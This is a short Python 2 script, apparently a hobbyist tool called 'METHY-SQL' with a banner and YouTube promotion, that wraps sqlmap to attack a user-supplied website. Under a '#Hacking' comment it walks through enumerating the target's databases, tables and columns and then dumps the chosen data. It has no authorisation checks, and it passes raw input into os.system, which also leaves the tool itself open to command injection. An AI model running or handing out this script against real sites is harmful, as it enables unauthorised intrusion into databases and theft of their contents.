import sys, os, time
from time import sleep as timeout
#Banner
os.system("clear")
os.system("figlet METHY-SQL")
print "Written by METHY "
print "YouTube : https://www.youtube.com/channel/UCaQLb31xiNu2T0buaGevJLw/videos"
print "YouTube : METHY "
print
#Hacking
web = raw_input("Target Web : ")
os.system("sqlmap -u %s --dbs"%(web))
data = raw_input("DataBase : ")
os.system("sqlmap -u %s -D %s --tables"%(web, data))
tables = raw_input("Tables : ")
os.system("sqlmap -u %s -D %s -T %s --columns"%(web, data,tables))
columns = raw_input("columns : ")
os.system("sqlmap -u %s -D %s -T %s -C %s --dump"%(web, data, tables, columns))
print "completed"
timeout(3)
print "Thank you "
print "youtube - METHY "
